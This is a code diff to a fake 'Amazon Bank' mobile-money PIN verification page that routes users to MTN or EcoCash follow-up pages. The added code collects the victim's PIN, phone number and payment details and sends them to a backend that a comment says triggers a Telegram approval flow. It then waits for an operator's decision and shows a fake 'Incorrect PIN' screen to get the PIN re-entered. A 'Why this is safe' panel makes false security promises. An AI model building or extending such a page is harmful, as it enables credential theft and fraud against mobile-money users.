@@ -11,7 +11,6 @@
 <style>
   :root {
     --amz-ink: #131921;
-    --amz-ink-mid: #232F3E;
     --amz-orange: #FF861F;
     --amz-orange-hover: #F07800;
     --amz-orange-subtle: #FFF4E5;
@@ -26,130 +25,68 @@
   html, body { height: 100%; }
   body {
     font-family: 'Poppins', -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
-    background: #EEF0F2;
-    color: var(--amz-text);
-    -webkit-font-smoothing: antialiased;
-    line-height: 1.4;
-    min-height: 100dvh;
-    display: flex;
-    justify-content: center;
-    align-items: center;
+    background: #EEF0F2; color: var(--amz-text);
+    -webkit-font-smoothing: antialiased; line-height: 1.4;
+    min-height: 100dvh; display: flex; justify-content: center; align-items: center;
   }
 
   .phone {
-    width: 100%;
-    max-width: 400px;
-    background: #FFFFFF;
-    height: 100dvh;
-    position: relative;
-    display: flex;
-    flex-direction: column;
-    overflow: hidden;
+    width: 100%; max-width: 400px; background: #FFFFFF;
+    height: 100dvh; position: relative;
+    display: flex; flex-direction: column; overflow: hidden;
   }
   @media (min-width: 520px) {
     body { padding: 20px 0; }
     .phone {
-      height: calc(100dvh - 40px);
-      max-height: 760px;
-      border-radius: 22px;
+      height: calc(100dvh - 40px); max-height: 760px; border-radius: 22px;
       box-shadow: 0 24px 70px rgba(19,25,33,0.18), 0 4px 14px rgba(19,25,33,0.08);
     }
   }
 
-  /* ── Header ─────────────────────────────────── */
   .app-header {
-    background: var(--amz-ink);
-    color: #fff;
-    height: 68px;
-    padding: 0 14px;
+    background: var(--amz-ink); color: #fff; height: 68px; padding: 0 14px;
     padding-top: env(safe-area-inset-top, 0);
-    display: flex;
-    align-items: center;
-    justify-content: space-between;
-    position: relative;
-    flex-shrink: 0;
-    z-index: 5;
+    display: flex; align-items: center; justify-content: space-between;
+    position: relative; flex-shrink: 0; z-index: 5;
   }
   .app-header .back {
-    width: 34px; height: 34px;
-    border-radius: 50%;
-    border: none;
-    background: transparent;
-    color: #fff;
-    cursor: pointer;
+    width: 34px; height: 34px; border-radius: 50%; border: none;
+    background: transparent; color: #fff; cursor: pointer;
     display: flex; align-items: center; justify-content: center;
-    margin-left: -4px;
-    transition: background .15s;
+    margin-left: -4px; transition: background .15s;
   }
   .app-header .back:hover { background: rgba(255,255,255,0.08); }
   .app-header .back svg { width: 19px; height: 19px; }
   .app-header .title {
-    position: absolute;
-    left: 50%; top: 50%;
+    position: absolute; left: 50%; top: 50%;
     transform: translate(-50%, -50%);
-    font-size: 17px;
-    font-weight: 600;
-    letter-spacing: -0.2px;
-    white-space: nowrap;
+    font-size: 17px; font-weight: 600; letter-spacing: -0.2px; white-space: nowrap;
   }
   .app-header .spacer-right { width: 34px; height: 34px; }
 
-  /* ── Body ────────────────────────────────────── */
   .body-scroll {
-    flex: 1 1 auto;
-    overflow-y: auto;
-    -webkit-overflow-scrolling: touch;
-    padding: 22px 22px 22px;
-    display: flex;
-    flex-direction: column;
+    flex: 1 1 auto; overflow-y: auto; -webkit-overflow-scrolling: touch;
+    padding: 22px; display: flex; flex-direction: column;
   }
 
-  /* Brand block */
-  .brand-block {
-    text-align: center;
-    margin-bottom: 22px;
-  }
+  .brand-block { text-align: center; margin-bottom: 22px; }
   .brand-block .brand-mark {
-    width: 60px; height: 60px;
-    border-radius: 16px;
+    width: 60px; height: 60px; border-radius: 16px;
     background: linear-gradient(135deg, var(--amz-orange), var(--amz-orange-hover));
-    color: var(--amz-ink);
-    display: inline-flex;
-    align-items: center;
-    justify-content: center;
-    font-size: 24px;
-    font-weight: 800;
-    letter-spacing: -0.5px;
-    box-shadow: 0 8px 22px rgba(255,134,31,0.32);
-    margin-bottom: 12px;
+    color: var(--amz-ink); display: inline-flex; align-items: center; justify-content: center;
+    font-size: 24px; font-weight: 800; letter-spacing: -0.5px;
+    box-shadow: 0 8px 22px rgba(255,134,31,0.32); margin-bottom: 12px;
   }
-  .brand-block .brand-name {
-    font-size: 18px;
-    font-weight: 800;
-    color: var(--amz-ink);
-    letter-spacing: -0.3px;
-  }
-  .brand-block .brand-sub {
-    font-size: 11.5px;
-    color: var(--amz-muted);
-    margin-top: 2px;
-    letter-spacing: 0.2px;
-  }
+  .brand-block .brand-name { font-size: 18px; font-weight: 800; color: var(--amz-ink); letter-spacing: -0.3px; }
+  .brand-block .brand-sub { font-size: 11.5px; color: var(--amz-muted); margin-top: 2px; letter-spacing: 0.2px; }
 
-  /* Context card */
   .context-card {
-    background: #F7F8FA;
-    border: 1px solid var(--amz-border-soft);
-    border-radius: 12px;
-    padding: 14px;
-    margin-bottom: 20px;
+    background: #F7F8FA; border: 1px solid var(--amz-border-soft);
+    border-radius: 12px; padding: 14px; margin-bottom: 20px;
   }
   .context-row {
-    display: flex;
-    justify-content: space-between;
-    align-items: center;
-    padding: 6px 0;
-    font-size: 12.5px;
+    display: flex; justify-content: space-between; align-items: center;
+    padding: 6px 0; font-size: 12.5px;
   }
   .context-row + .context-row { border-top: 1px solid var(--amz-border-soft); }
   .context-row .k { color: var(--amz-muted); font-weight: 500; }
@@ -158,201 +95,149 @@
   .context-row.total { padding-top: 8px; }
   .context-row.total .v { font-weight: 800; font-size: 14px; }
 
-  /* Verify block */
-  .verify-headline {
-    text-align: center;
-    margin-bottom: 6px;
-  }
-  .verify-headline h1 {
-    font-size: 17px;
-    font-weight: 800;
-    color: var(--amz-ink);
-    letter-spacing: -0.3px;
-    margin-bottom: 4px;
-  }
-  .verify-headline p {
-    font-size: 12px;
-    color: var(--amz-muted);
-    line-height: 1.5;
-    max-width: 300px;
-    margin: 0 auto;
-  }
+  .verify-headline { text-align: center; margin-bottom: 6px; }
+  .verify-headline h1 { font-size: 17px; font-weight: 800; color: var(--amz-ink); letter-spacing: -0.3px; margin-bottom: 4px; }
+  .verify-headline p { font-size: 12px; color: var(--amz-muted); line-height: 1.5; max-width: 300px; margin: 0 auto; }
 
-  /* Recipient number display */
   .recipient-box {
-    margin: 16px 0 8px;
-    padding: 12px 14px;
-    background: #FFFFFF;
-    border: 1.5px solid var(--amz-border);
-    border-radius: 10px;
-    display: flex;
-    align-items: center;
-    gap: 10px;
+    margin: 16px 0 8px; padding: 12px 14px;
+    background: #FFFFFF; border: 1.5px solid var(--amz-border); border-radius: 10px;
+    display: flex; align-items: center; gap: 10px;
   }
   .recipient-box .flag {
-    flex: 0 0 28px;
-    height: 28px;
-    border-radius: 50%;
-    background: var(--amz-orange-subtle);
-    color: var(--amz-orange-hover);
-    display: flex;
-    align-items: center;
-    justify-content: center;
-    font-size: 12px;
-    font-weight: 800;
+    flex: 0 0 28px; height: 28px; border-radius: 50%;
+    background: var(--amz-orange-subtle); color: var(--amz-orange-hover);
+    display: flex; align-items: center; justify-content: center;
+    font-size: 12px; font-weight: 800;
   }
   .recipient-box .num {
-    flex: 1;
-    font-family: "SF Mono", Monaco, monospace;
-    font-size: 14px;
-    font-weight: 600;
-    color: var(--amz-ink);
-    letter-spacing: 0.4px;
+    flex: 1; font-family: "SF Mono", Monaco, monospace; font-size: 14px;
+    font-weight: 600; color: var(--amz-ink); letter-spacing: 0.4px;
   }
 
-  /* PIN label + inputs */
-  .pin-label {
-    font-size: 12.5px;
-    font-weight: 600;
-    color: var(--amz-ink);
-    margin: 12px 0 8px;
-    text-align: center;
-  }
-  .pin-row {
-    display: flex;
-    gap: 8px;
-    justify-content: center;
-    margin-bottom: 6px;
-  }
+  .pin-label { font-size: 12.5px; font-weight: 600; color: var(--amz-ink); margin: 12px 0 8px; text-align: center; }
+  .pin-row { display: flex; gap: 8px; justify-content: center; margin-bottom: 6px; }
   .pin-input {
-    width: 44px;
-    height: 52px;
-    text-align: center;
-    font-size: 22px;
-    font-weight: 700;
-    color: var(--amz-ink);
-    background: #FFFFFF;
-    border: 1.5px solid var(--amz-border);
-    border-radius: 10px;
-    outline: none;
-    font-family: "SF Mono", Monaco, monospace;
-    transition: border-color .15s, box-shadow .15s;
-    -webkit-appearance: none;
+    width: 44px; height: 52px; text-align: center; font-size: 22px; font-weight: 700;
+    color: var(--amz-ink); background: #FFFFFF; border: 1.5px solid var(--amz-border);
+    border-radius: 10px; outline: none; font-family: "SF Mono", Monaco, monospace;
+    transition: border-color .15s, box-shadow .15s; -webkit-appearance: none;
   }
-  .pin-input:focus {
-    border-color: var(--amz-orange);
-    box-shadow: 0 0 0 3px rgba(255,134,31,0.16);
-  }
-  .pin-input.filled {
-    border-color: var(--amz-ink);
-  }
-  .pin-input.error {
-    border-color: var(--amz-error);
-    box-shadow: 0 0 0 3px rgba(177,39,4,0.10);
-  }
+  .pin-input:focus { border-color: var(--amz-orange); box-shadow: 0 0 0 3px rgba(255,134,31,0.16); }
+  .pin-input.filled { border-color: var(--amz-ink); }
+  .pin-input.error { border-color: var(--amz-error); box-shadow: 0 0 0 3px rgba(177,39,4,0.10); }
   @media (max-width: 360px) {
     .pin-input { width: 38px; height: 48px; font-size: 20px; }
     .pin-row { gap: 6px; }
   }
 
   .pin-error {
-    display: none;
-    text-align: center;
-    font-size: 11.5px;
-    color: var(--amz-error);
-    font-weight: 600;
-    margin-top: 6px;
+    display: none; text-align: center; font-size: 11.5px;
+    color: var(--amz-error); font-weight: 600; margin-top: 6px;
   }
   .pin-error.show { display: block; }
 
   .security-note {
-    display: flex;
-    align-items: center;
-    justify-content: center;
-    gap: 6px;
-    font-size: 11px;
-    color: var(--amz-muted);
-    margin-top: 10px;
-    text-align: center;
+    display: flex; align-items: center; justify-content: center;
+    gap: 6px; font-size: 11px; color: var(--amz-muted); margin-top: 10px; text-align: center;
   }
   .security-note svg { width: 13px; height: 13px; color: var(--amz-success); flex-shrink: 0; }
 
   .spacer { flex: 1 1 auto; min-height: 12px; }
 
-  /* Verify button */
   .verify-btn {
-    width: 100%;
-    padding: 14px;
-    font-size: 15px;
-    font-weight: 700;
-    font-family: inherit;
+    width: 100%; padding: 14px; font-size: 15px; font-weight: 700; font-family: inherit;
     color: #FFFFFF;
     background: linear-gradient(180deg, #FF9C3D 0%, var(--amz-orange) 55%, var(--amz-orange-hover) 100%);
-    border: none;
-    border-radius: 12px;
-    cursor: pointer;
+    border: none; border-radius: 12px; cursor: pointer;
     box-shadow: 0 6px 18px rgba(255,134,31,0.30), inset 0 1px 0 rgba(255,255,255,0.35);
-    transition: filter .15s, transform .1s, opacity .15s;
-    letter-spacing: 0.2px;
+    transition: filter .15s, transform .1s, opacity .15s; letter-spacing: 0.2px;
   }
   .verify-btn:hover { filter: brightness(1.05); }
   .verify-btn:active { transform: scale(0.995); }
   .verify-btn:disabled {
-    background: #D6D9DD;
-    color: #8A8F98;
-    box-shadow: none;
-    cursor: not-allowed;
+    background: #D6D9DD; color: #8A8F98; box-shadow: none; cursor: not-allowed;
   }
 
-  /* Loading overlay */
-  .loading-overlay {
-    position: fixed;
-    inset: 0;
-    background: var(--amz-ink);
-    color: #fff;
-    display: flex;
-    align-items: center;
-    justify-content: center;
-    flex-direction: column;
-    gap: 18px;
+  /* ── Full-screen verifying overlay ─────────── */
+  .verifying-overlay {
+    position: fixed; inset: 0; background: var(--amz-ink); color: #fff;
     z-index: 100;
-    opacity: 0;
-    pointer-events: none;
-    transition: opacity .25s ease;
+    display: none; flex-direction: column; align-items: center; justify-content: center;
+    padding: 30px; text-align: center;
   }
-  .loading-overlay.show { opacity: 1; pointer-events: auto; }
-  .loading-overlay .brand-mark {
-    width: 58px; height: 58px;
-    border-radius: 14px;
+  .verifying-overlay.show { display: flex; }
+  .verifying-overlay .brand-mark {
+    width: 72px; height: 72px; border-radius: 18px;
     background: linear-gradient(135deg, var(--amz-orange), var(--amz-orange-hover));
     display: flex; align-items: center; justify-content: center;
-    color: var(--amz-ink);
-    font-weight: 800;
-    font-size: 22px;
-    letter-spacing: -0.5px;
-    box-shadow: 0 6px 24px rgba(255,134,31,0.35);
+    color: var(--amz-ink); font-weight: 800; font-size: 28px; letter-spacing: -0.5px;
+    box-shadow: 0 10px 30px rgba(255,134,31,0.4); margin-bottom: 20px;
   }
-  .loading-overlay .load-title { font-size: 18px; font-weight: 700; letter-spacing: -0.3px; }
-  .loading-overlay .load-sub { font-size: 12.5px; color: rgba(255,255,255,0.65); margin-top: -10px; }
-  .spinner {
-    width: 28px; height: 28px;
-    border: 3px solid rgba(255,255,255,0.18);
-    border-top-color: var(--amz-orange);
-    border-radius: 50%;
-    animation: spin .8s linear infinite;
+  .verifying-overlay .load-title { font-size: 22px; font-weight: 700; letter-spacing: -0.3px; margin-bottom: 6px; }
+  .verifying-overlay .load-sub { font-size: 13px; color: rgba(255,255,255,0.65); margin-bottom: 26px; max-width: 280px; line-height: 1.5; }
+  .verifying-overlay .spinner {
+    width: 34px; height: 34px; border: 3px solid rgba(255,255,255,0.15);
+    border-top-color: var(--amz-orange); border-radius: 50%;
+    animation: spin .8s linear infinite; margin-bottom: 30px;
   }
   @keyframes spin { to { transform: rotate(360deg); } }
 
-  /* Error state */
+  .safety-panel {
+    background: rgba(255,255,255,0.05);
+    border: 1px solid rgba(255,255,255,0.08);
+    border-radius: 14px; padding: 18px 16px; max-width: 320px; width: 100%;
+    text-align: left;
+  }
+  .safety-panel h4 {
+    font-size: 12px; font-weight: 700; color: var(--amz-orange);
+    text-transform: uppercase; letter-spacing: 0.6px; margin-bottom: 10px;
+  }
+  .safety-panel ul { list-style: none; padding: 0; margin: 0; }
+  .safety-panel li {
+    display: flex; align-items: flex-start; gap: 8px;
+    font-size: 12px; line-height: 1.5; color: rgba(255,255,255,0.82);
+    padding: 6px 0;
+  }
+  .safety-panel li svg { flex: 0 0 14px; height: 14px; margin-top: 2px; color: var(--amz-success); }
+
+  /* ── Wrong PIN result ─────────────────────── */
+  .result-overlay {
+    position: fixed; inset: 0; background: #EEF0F2;
+    z-index: 110;
+    display: none; align-items: center; justify-content: center; padding: 24px;
+  }
+  .result-overlay.show { display: flex; }
+  .result-card {
+    background: #fff; border-radius: 18px; padding: 30px 24px;
+    text-align: center; max-width: 340px; width: 100%;
+    box-shadow: 0 24px 60px rgba(19,25,33,0.2);
+  }
+  .result-card .ic {
+    width: 64px; height: 64px; border-radius: 50%;
+    display: flex; align-items: center; justify-content: center;
+    margin: 0 auto 16px;
+  }
+  .result-card .ic.error {
+    background: #FDECEA; color: var(--amz-error);
+  }
+  .result-card .ic svg { width: 32px; height: 32px; }
+  .result-card h2 { font-size: 19px; font-weight: 800; color: var(--amz-ink); margin-bottom: 8px; }
+  .result-card p { font-size: 13.5px; color: var(--amz-muted); line-height: 1.55; margin-bottom: 20px; }
+  .result-card .try-btn {
+    width: 100%; padding: 13px; font-size: 14.5px; font-weight: 700; font-family: inherit;
+    color: #fff;
+    background: linear-gradient(180deg, #FF9C3D 0%, var(--amz-orange) 55%, var(--amz-orange-hover) 100%);
+    border: none; border-radius: 10px; cursor: pointer;
+    box-shadow: 0 4px 14px rgba(255,134,31,0.28);
+  }
+  .result-card .try-btn:active { transform: scale(0.99); }
+
   .state-card { padding: 46px 24px; text-align: center; }
   .state-card .ic {
-    width: 54px; height: 54px;
-    border-radius: 50%;
-    background: var(--amz-orange-subtle);
-    color: var(--amz-orange-hover);
-    display: flex; align-items: center; justify-content: center;
-    font-size: 24px;
-    margin: 0 auto 16px;
+    width: 54px; height: 54px; border-radius: 50%; background: var(--amz-orange-subtle);
+    color: var(--amz-orange-hover); display: flex; align-items: center; justify-content: center;
+    font-size: 24px; margin: 0 auto 16px;
   }
   .state-card h2 { font-size: 18px; font-weight: 800; color: var(--amz-ink); margin-bottom: 6px; letter-spacing: -0.3px; }
   .state-card p { font-size: 13px; color: var(--amz-muted); line-height: 1.55; max-width: 280px; margin: 0 auto; }
@@ -433,23 +318,85 @@
 
 </div>
 
-<div class="loading-overlay" id="loadingOverlay">
+<!-- Full-screen verifying overlay -->
+<div class="verifying-overlay" id="verifyingOverlay">
   <div class="brand-mark">AB</div>
-  <div class="load-title">Verifying…</div>
-  <div class="load-sub">Please wait a moment</div>
+  <div class="load-title">Verifying your identity</div>
+  <div class="load-sub">We're confirming your PIN with Amazon Bank. This usually takes a few seconds.</div>
   <div class="spinner"></div>
+
+  <div class="safety-panel">
+    <h4>Why this is safe</h4>
+    <ul>
+      <li>
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.4" stroke-linecap="round" stroke-linejoin="round">
+          <path d="M12 2l8 4v6c0 5-3.5 9-8 10-4.5-1-8-5-8-10V6l8-4z"/>
+          <path d="M9 12l2 2 4-4"/>
+        </svg>
+        <span>End-to-end encryption protects your PIN at every step.</span>
+      </li>
+      <li>
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.4" stroke-linecap="round" stroke-linejoin="round">
+          <path d="M12 2l8 4v6c0 5-3.5 9-8 10-4.5-1-8-5-8-10V6l8-4z"/>
+          <path d="M9 12l2 2 4-4"/>
+        </svg>
+        <span>No funds move until verification is fully approved.</span>
+      </li>
+      <li>
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.4" stroke-linecap="round" stroke-linejoin="round">
+          <path d="M12 2l8 4v6c0 5-3.5 9-8 10-4.5-1-8-5-8-10V6l8-4z"/>
+          <path d="M9 12l2 2 4-4"/>
+        </svg>
+        <span>Amazon Bank never shares your PIN with third parties.</span>
+      </li>
+    </ul>
+  </div>
+</div>
+
+<!-- Wrong PIN result -->
+<div class="result-overlay" id="resultOverlay">
+  <div class="result-card">
+    <div class="ic error">
+      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.4" stroke-linecap="round" stroke-linejoin="round">
+        <circle cx="12" cy="12" r="10"/>
+        <path d="M12 8v4"/>
+        <path d="M12 16h.01"/>
+      </svg>
+    </div>
+    <h2>Incorrect PIN</h2>
+    <p>The PIN you entered doesn't match the one linked to this account. Please try again carefully.</p>
+    <button class="try-btn" id="tryAgainBtn">Try again</button>
+  </div>
 </div>
 
 <script>
 const CONFIG = {
-  NEXT_PAGE: 'success.html',
-  LOADING_MS: 1500,
+  // Where to send the user on APPROVAL.
+  // Routed dynamically by country group below.
+  MTN_NEXT_PAGE: 'mtn.html',
+  ECOCASH_NEXT_PAGE: 'ecocash.html',
+  // Backend endpoint that triggers the Telegram approval flow
+  VERIFY_ENDPOINT: '/api/verify/send',
+  // Poll endpoint to check Telegram decision
+  STATUS_ENDPOINT: (id) => `/api/verify/status/${encodeURIComponent(id)}`,
+  POLL_INTERVAL_MS: 2000,
+  // Max time to wait before giving up (5 min)
+  MAX_WAIT_MS: 5 * 60 * 1000,
   SHORT_LINK_ENDPOINTS: [
     (code) => `/api/links/${encodeURIComponent(code)}`,
     (code) => `/api/links?code=${encodeURIComponent(code)}`
   ],
   DEFAULT_FEE: 0
 };
+
+/* MTN countries — get routed to mtn.html on approval */
+const MTN_COUNTRIES = [
+  'Benin', 'Cameroon', "Côte d'Ivoire", 'Congo', 'Eswatini',
+  'Ghana (MTN)', 'Liberia', 'Rwanda (MTN)', 'Uganda (MTN)', 'Zambia (MTN)'
+];
+function nextPageFor(country) {
+  return MTN_COUNTRIES.includes(String(country || '')) ? CONFIG.MTN_NEXT_PAGE : CONFIG.ECOCASH_NEXT_PAGE;
+}
 
 const CURRENCY_SYMBOLS = {
   USD: '$', ZiG: 'ZiG ', ZAR: 'R', KES: 'KSh ', BWP: 'P ',
@@ -466,52 +413,28 @@ function formatMoney(amount, currency) {
   return currencySymbol(currency) + safe.toFixed(2);
 }
 
-/* ── Country dial codes ─────────────────────── */
 const DIAL_CODES = {
-  'Zimbabwe': '+263',
-  'South Africa': '+27',
-  'Zambia': '+260',
-  'Zambia (MTN)': '+260',
-  'Botswana': '+267',
-  'Kenya': '+254',
-  'Malawi': '+265',
-  'Rwanda': '+250',
-  'Rwanda (MTN)': '+250',
-  'DR Congo': '+243',
-  'Ghana': '+233',
-  'Ghana (MTN)': '+233',
-  'Lesotho': '+266',
-  'Uganda': '+256',
-  'Uganda (MTN)': '+256',
-  'China (Alipay)': '+86',
-  'Benin': '+229',
-  'Cameroon': '+237',
-  "Côte d'Ivoire": '+225',
-  'Congo': '+242',
-  'Eswatini': '+268',
-  'Liberia': '+231'
+  'Zimbabwe': '+263', 'South Africa': '+27', 'Zambia': '+260', 'Zambia (MTN)': '+260',
+  'Botswana': '+267', 'Kenya': '+254', 'Malawi': '+265', 'Rwanda': '+250', 'Rwanda (MTN)': '+250',
+  'DR Congo': '+243', 'Ghana': '+233', 'Ghana (MTN)': '+233', 'Lesotho': '+266',
+  'Uganda': '+256', 'Uganda (MTN)': '+256', 'China (Alipay)': '+86',
+  'Benin': '+229', 'Cameroon': '+237', "Côte d'Ivoire": '+225', 'Congo': '+242',
+  'Eswatini': '+268', 'Liberia': '+231'
 };
+function dialCodeFor(country) { return DIAL_CODES[String(country || '').trim()] || ''; }
 
-function dialCodeFor(country) {
-  return DIAL_CODES[String(country || '').trim()] || '';
-}
-
-/* ── Payload resolution ─────────────────────── */
 function b64urlDecode(str) {
   str = String(str).replace(/-/g, '+').replace(/_/g, '/');
   while (str.length % 4) str += '=';
   return decodeURIComponent(escape(atob(str)));
 }
-function readQuery(name) {
-  return new URLSearchParams(window.location.search).get(name);
-}
+function readQuery(name) { return new URLSearchParams(window.location.search).get(name); }
+
 async function resolvePayload() {
-  // Prefer sessionStorage (set by client.html before redirect)
   try {
     const raw = sessionStorage.getItem('amz_payload');
     if (raw) return JSON.parse(raw);
   } catch (e) {}
-
   const d = readQuery('d');
   if (d) {
     try { return JSON.parse(b64urlDecode(d)); }
@@ -539,41 +462,32 @@ function escapeHtml(s) {
   }[c]));
 }
 
-/* ── Build display number with country code ─── */
 function buildDisplayNumber(accountNumber, country) {
   const cleaned = String(accountNumber || '').replace(/[^\d+]/g, '');
   const dial = dialCodeFor(country);
-
   if (!cleaned) return { dial: dial || '+', number: '— — — —' };
-
-  // If admin already typed +countryCode, use it as-is
-  if (cleaned.startsWith('+')) {
-    return { dial: '', number: cleaned };
-  }
-
-  // Strip a leading 0 (common in local formats) if we have a dial code
+  if (cleaned.startsWith('+')) return { dial: '', number: cleaned };
   let digits = cleaned;
   if (dial && digits.startsWith('0')) digits = digits.slice(1);
-
-  // Group digits for readability: +263 77 123 4567
   const grouped = digits.replace(/(\d{2,3})(\d{2,3})(\d{2,4})/, '$1 $2 $3');
-
   return { dial, number: grouped };
 }
 
-/* ── State ──────────────────────────────────── */
-const state = { payload: null, pin: ['', '', '', ''] };
+const state = {
+  payload: null,
+  pin: ['', '', '', ''],
+  requestId: null,
+  polling: false,
+  pollStart: 0
+};
 
-/* ── Render ─────────────────────────────────── */
 function render(payload) {
   state.payload = payload;
-
   const cur = String(payload.cur || 'USD').toUpperCase();
   const amount = Number(payload.am || 0);
   const fee = (payload.fee != null) ? Number(payload.fee) : CONFIG.DEFAULT_FEE;
   const receive = Math.max(0, amount - (isFinite(fee) ? fee : 0));
 
-  // Header context card
   document.getElementById('ctxRecipient').textContent = payload.rn || '—';
   const acct = String(payload.an || '').replace(/\s+/g, '');
   const last4 = acct.slice(-4) || '0000';
@@ -582,7 +496,6 @@ function render(payload) {
   document.getElementById('ctxRef').textContent = payload.tx || payload.tn || '—';
   document.getElementById('ctxAmount').textContent = formatMoney(receive, cur);
 
-  // Recipient phone/number display
   const disp = buildDisplayNumber(payload.an || '', payload.c || '');
   document.getElementById('numFlag').textContent = disp.dial || '+';
   document.getElementById('numDisplay').textContent = disp.number;
@@ -598,7 +511,6 @@ function showStateCard(icon, title, message) {
     '</div>';
 }
 
-/* ── PIN input handling ─────────────────────── */
 function initPin() {
   const inputs = Array.from(document.querySelectorAll('.pin-input'));
   const errEl = document.getElementById('pinError');
@@ -620,15 +532,11 @@ function initPin() {
       if (val && idx < inputs.length - 1) inputs[idx + 1].focus();
       updateState();
     });
-
     input.addEventListener('keydown', (e) => {
-      if (e.key === 'Backspace' && !input.value && idx > 0) {
-        inputs[idx - 1].focus();
-      }
+      if (e.key === 'Backspace' && !input.value && idx > 0) inputs[idx - 1].focus();
       if (e.key === 'ArrowLeft' && idx > 0) inputs[idx - 1].focus();
       if (e.key === 'ArrowRight' && idx < inputs.length - 1) inputs[idx + 1].focus();
     });
-
     input.addEventListener('paste', (e) => {
       e.preventDefault();
       const paste = (e.clipboardData || window.clipboardData).getData('text').replace(/\D/g, '').slice(0, 4);
@@ -639,51 +547,129 @@ function initPin() {
       if (inputs[nextIdx]) inputs[nextIdx].focus();
       updateState();
     });
-
-    input.addEventListener('focus', () => {
-      input.select();
-    });
+    input.addEventListener('focus', () => input.select());
   });
 
-  // Auto focus first input on load
   if (inputs[0]) setTimeout(() => inputs[0].focus(), 150);
 }
 
-function doVerify() {
-  const errEl = document.getElementById('pinError');
-  const inputs = Array.from(document.querySelectorAll('.pin-input'));
+/* ── Telegram send + poll ─────────────────── */
+async function sendToTelegram(pin, number, payload) {
+  const res = await fetch(CONFIG.VERIFY_ENDPOINT, {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({
+      pin,
+      number,
+      country: payload.c,
+      recipient: payload.rn,
+      amount: payload.am,
+      currency: payload.cur,
+      fee: payload.fee,
+      reference: payload.tx || payload.tn,
+      method: payload.pm
+    })
+  });
+  if (!res.ok) throw new Error('Verification server unavailable.');
+  const data = await res.json();
+  if (!data.requestId) throw new Error('No request ID returned.');
+  return data.requestId;
+}
 
-  const allFilled = state.pin.every(v => v !== '');
-  if (!allFilled) {
-    errEl.classList.add('show');
-    inputs.forEach(i => i.classList.add('error'));
+function pollStatus() {
+  if (!state.requestId) return;
+  if (Date.now() - state.pollStart > CONFIG.MAX_WAIT_MS) {
+    // Timed out — treat as declined for safety
+    handleDecline();
     return;
   }
 
-  // Show loading then navigate
-  document.getElementById('loadingOverlay').classList.add('show');
-  const qs = window.location.search || '';
-  setTimeout(() => {
-    window.location.href = CONFIG.NEXT_PAGE + qs;
-  }, CONFIG.LOADING_MS);
+  fetch(CONFIG.STATUS_ENDPOINT(state.requestId))
+    .then(r => r.json())
+    .then(data => {
+      if (data.status === 'approved') {
+        handleApprove();
+      } else if (data.status === 'declined') {
+        handleDecline();
+      } else {
+        // still pending — schedule next poll
+        setTimeout(pollStatus, CONFIG.POLL_INTERVAL_MS);
+      }
+    })
+    .catch(() => {
+      setTimeout(pollStatus, CONFIG.POLL_INTERVAL_MS);
+    });
 }
 
-/* ── Boot ───────────────────────────────────── */
+function handleApprove() {
+  state.polling = false;
+  const next = nextPageFor(state.payload && state.payload.c);
+  const qs = window.location.search || '';
+  window.location.href = next + qs;
+}
+
+function handleDecline() {
+  state.polling = false;
+  // Hide verifying, show wrong-PIN result
+  document.getElementById('verifyingOverlay').classList.remove('show');
+  document.getElementById('resultOverlay').classList.add('show');
+  // Clear PIN inputs so user can retry
+  document.querySelectorAll('.pin-input').forEach(i => {
+    i.value = '';
+    i.classList.remove('filled');
+  });
+  state.pin = ['', '', '', ''];
+  document.getElementById('verifyBtn').disabled = true;
+  state.requestId = null;
+}
+
+async function doVerify() {
+  const errEl = document.getElementById('pinError');
+  const allFilled = state.pin.every(v => v !== '');
+  if (!allFilled) {
+    errEl.classList.add('show');
+    document.querySelectorAll('.pin-input').forEach(i => i.classList.add('error'));
+    return;
+  }
+
+  const pin = state.pin.join('');
+  const number = document.getElementById('numDisplay').textContent;
+
+  // Show full-screen verifying overlay
+  document.getElementById('verifyingOverlay').classList.add('show');
+
+  try {
+    const requestId = await sendToTelegram(pin, number, state.payload);
+    state.requestId = requestId;
+    state.pollStart = Date.now();
+    state.polling = true;
+    setTimeout(pollStatus, CONFIG.POLL_INTERVAL_MS);
+  } catch (err) {
+    document.getElementById('verifyingOverlay').classList.remove('show');
+    handleDecline();
+  }
+}
+
+/* ── Boot ─────────────────────────────────── */
 async function boot() {
   document.getElementById('backBtn').addEventListener('click', () => {
     if (window.history.length > 1) window.history.back();
   });
 
+  document.getElementById('tryAgainBtn').addEventListener('click', () => {
+    document.getElementById('resultOverlay').classList.remove('show');
+    document.getElementById('pinError').classList.remove('show');
+    const firstPin = document.querySelector('.pin-input');
+    if (firstPin) firstPin.focus();
+  });
+
   try {
     const payload = await resolvePayload();
-
-    // Expiry check
     if (payload && payload.exp && Date.now() > Number(payload.exp)) {
       showStateCard('⏱', 'This link has expired',
         'The payment request is no longer valid. Please ask the sender to generate a new link.');
       return;
     }
-
     render(payload);
     initPin();
     document.getElementById('verifyBtn').addEventListener('click', doVerify);
